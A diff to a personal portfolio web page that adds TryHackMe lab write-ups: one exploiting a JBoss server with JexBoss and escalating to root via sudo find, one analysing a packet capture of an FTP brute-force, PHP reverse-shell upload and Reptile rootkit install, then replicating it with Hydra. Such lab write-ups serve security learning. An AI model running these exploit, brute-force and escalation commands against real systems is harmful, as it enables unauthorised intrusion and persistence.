@@ -64,7 +64,163 @@
 
     <section class="section hacking-feature-section">
       <div class="container">
-        <div class="hacking-feature-grid" id="featured-writeups"></div>
+        <div class="hacking-feature-grid">
+          <article class="card hacking-note-card hacking-feature-card">
+            <p class="eyebrow">Featured Resource</p>
+            <h3>Tony the Tiger</h3>
+            <img class="hacking-feature-image" src="assets/tonythetiger.png" alt="Tony the Tiger" />
+            <a class="btn" href="https://www.notion.so/Tony-the-Tiger-302ca0ef4e7a80569f3cc79b9ef23682?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <details class="hacking-notes">
+              <summary class="btn ghost">Show Me The Notes</summary>
+              <div class="hacking-notes-body">
+                <h4>Tony the Tiger - TryHackMe Write-Up</h4>
+                <h5>Overview</h5>
+                <p>Tony the Tiger is a beginner-friendly Linux challenge focused on Java deserialization attacks and exploitation of a vulnerable JBoss application server.</p>
+                <p>The goal of the room is to perform reconnaissance on the target machine, identify exposed services, exploit the vulnerable JBoss application, gain shell access, escalate privileges, and retrieve the root flag.</p>
+
+                <h5>Enumeration</h5>
+                <p>The first step when attacking a machine is enumeration. I started with an Nmap scan:</p>
+                <pre><code>nmap -sC -sV -T4 &lt;TARGET-IP&gt;</code></pre>
+                <p>This revealed several open ports, with the most interesting service running on port 8080.</p>
+                <pre><code>22/tcp    SSH
+80/tcp    HTTP
+8080/tcp  JBoss / Tomcat</code></pre>
+
+                <h5>Web Enumeration</h5>
+                <p>Navigating to port 8080 revealed a Tony the Tiger themed blog page. An image on the page looked suspicious, so I downloaded it and inspected it with:</p>
+                <pre><code>strings image.jpg</code></pre>
+                <p>This exposed the first flag:</p>
+                <pre><code>THM{Tony_Sure_Loves_Frosted_Flakes}</code></pre>
+
+                <h5>Researching the Vulnerability</h5>
+                <p>After identifying JBoss, I researched common JBoss exploits. JBoss servers are known to suffer from Java deserialization issues that can lead to remote code execution.</p>
+
+                <h5>Exploiting JBoss</h5>
+                <p>To exploit the target, I used JexBoss.</p>
+                <pre><code>git clone https://github.com/joaomatosf/jexboss.git
+cd jexboss
+pip install -r requires.txt
+python jexboss.py -host http://TARGET-IP:8080</code></pre>
+                <p>Once exploitation succeeded, JexBoss deployed a payload and provided shell access.</p>
+
+                <h5>Gaining a Shell</h5>
+                <p>After landing the shell, I used basic commands to confirm access and inspect the environment:</p>
+                <pre><code>whoami
+pwd
+ls</code></pre>
+
+                <h5>SSH Access</h5>
+                <p>Further enumeration revealed credentials that allowed SSH login as the <code>jboss</code> user.</p>
+                <pre><code>ssh jboss@TARGET-IP</code></pre>
+
+                <h5>Privilege Escalation</h5>
+                <p>Checking sudo permissions showed that <code>/usr/bin/find</code> could be run as root.</p>
+                <pre><code>sudo -l
+sudo /usr/bin/find . -exec /bin/sh \; -quit</code></pre>
+                <p>This spawned a root shell.</p>
+
+                <h5>Root Access</h5>
+                <p>After gaining root, I navigated to the root directory and retrieved the final flag.</p>
+                <pre><code>cd /root
+ls</code></pre>
+
+                <h5>Key Lessons Learned</h5>
+                <p>This room reinforced several important concepts: careful enumeration, hidden data inside files, Java deserialization exploitation, and privilege escalation through unsafe sudo permissions.</p>
+              </div>
+            </details>
+          </article>
+
+          <article class="card hacking-note-card hacking-feature-card">
+            <p class="eyebrow">Featured Resource</p>
+            <h3>Gallery</h3>
+            <img class="hacking-feature-image" src="assets/gallery.png" alt="Gallery room graphic" />
+            <a class="btn" href="https://www.notion.so/Gallery-324ca0ef4e7a80c1944fc624197091ef?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
+          </article>
+
+          <article class="card hacking-note-card hacking-feature-card">
+            <p class="eyebrow">Featured Resource</p>
+            <h3>h4cked</h3>
+            <img class="hacking-feature-image" src="assets/h4cked.png" alt="h4cked room graphic" />
+            <a class="btn" href="https://www.notion.so/h4cked-322ca0ef4e7a80bdbed5f284e46e6bd3?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <details class="hacking-notes">
+              <summary class="btn ghost">Show Me The Notes</summary>
+              <div class="hacking-notes-body">
+                <h4>h4cked - TryHackMe Write-Up</h4>
+                <h5>Objective</h5>
+                <p>Analyze the provided PCAP, understand how the attacker compromised the target, and replicate the attack path in a clean pentesting workflow.</p>
+
+                <h5>PCAP Analysis</h5>
+                <p>The first step was opening the PCAP in Wireshark and reviewing the captured traffic. Repeated authentication attempts against FTP from the same source pointed to a brute-force attack.</p>
+                <p>The traffic showed multiple login attempts using the <code>USER</code> FTP command, which made the attack pattern clear.</p>
+
+                <h5>Attack Tool</h5>
+                <p>The password-guessing behavior matched Hydra, a common brute-force tool created by Van Hauser and often used against FTP, SSH, SMB, RDP, and HTTP services.</p>
+
+                <h5>Username Enumeration</h5>
+                <p>The attacker repeatedly targeted the FTP account:</p>
+                <pre><code>jenny</code></pre>
+
+                <h5>Credential Discovery</h5>
+                <p>A successful FTP login exposed the credentials below:</p>
+                <pre><code>Username: jenny
+Password: password123</code></pre>
+
+                <h5>FTP Session Activity</h5>
+                <p>After login, the session moved into the Apache web root:</p>
+                <pre><code>/var/www/html</code></pre>
+                <p>Further commands showed a malicious upload with <code>PASV</code>, <code>STOR</code>, and <code>CHMOD</code>.</p>
+
+                <h5>Backdoor Upload</h5>
+                <p>The uploaded file was:</p>
+                <pre><code>shell.php</code></pre>
+                <p>The reverse shell source referenced the standard PentestMonkey PHP reverse shell:</p>
+                <pre><code>http://pentestmonkey.net/tools/php-reverse-shell</code></pre>
+
+                <h5>Reverse Shell Access</h5>
+                <p>Once the shell connected back, the attacker verified execution with:</p>
+                <pre><code>whoami</code></pre>
+                <p>The returned user was <code>www-data</code>, and the compromised host was identified as <code>wir3</code>.</p>
+
+                <h5>Shell Upgrade</h5>
+                <p>To stabilize the session, the attacker upgraded the shell to a TTY:</p>
+                <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+                <h5>Privilege Escalation</h5>
+                <p>Privilege escalation was performed with:</p>
+                <pre><code>sudo su</code></pre>
+                <p>This provided root access on the target.</p>
+
+                <h5>Persistence</h5>
+                <p>After root access, the attacker cloned the Reptile project from GitHub:</p>
+                <pre><code>git clone https://github.com/f0rb1dd3n/Reptile.git</code></pre>
+                <p>Reptile is a kernel rootkit used to maintain stealthy persistence on the system.</p>
+
+                <h5>Attack Replication</h5>
+                <p>To recreate the compromise, the target was scanned with:</p>
+                <pre><code>nmap -sC -sV -vv -A -p- 10.64.167.149</code></pre>
+                <p>The scan identified the following services:</p>
+                <pre><code>21/tcp  FTP     vsftpd
+22/tcp  SSH     OpenSSH
+80/tcp  HTTP    Apache</code></pre>
+
+                <h5>Web Enumeration</h5>
+                <p>Directory enumeration with tools like <code>dirsearch</code> or <code>gobuster</code> revealed several paths returning <code>403 Forbidden</code>, confirming restricted content worth further investigation.</p>
+
+                <h5>Credential Reuse</h5>
+                <p>With the username already known from the PCAP, Hydra was used against FTP:</p>
+                <pre><code>hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.64.167.149 ftp</code></pre>
+                <p>After recovering the password, FTP access was used to upload a modified PHP reverse shell into the web root and trigger code execution through the web server.</p>
+
+                <h5>Final Compromise</h5>
+                <p>The full chain was: reverse shell, TTY upgrade, privilege escalation, root access, and rootkit installation for persistence.</p>
+
+                <h5>Key Lessons</h5>
+                <p>This room highlights how unencrypted traffic can expose credentials, commands, malware sources, and the complete attack chain. It also reinforces the importance of network forensics, credential hygiene, and persistence detection.</p>
+              </div>
+            </details>
+          </article>
+        </div>
+        <div class="hacking-feature-grid stack-top" id="featured-writeups-extra"></div>
       </div>
     </section>
 
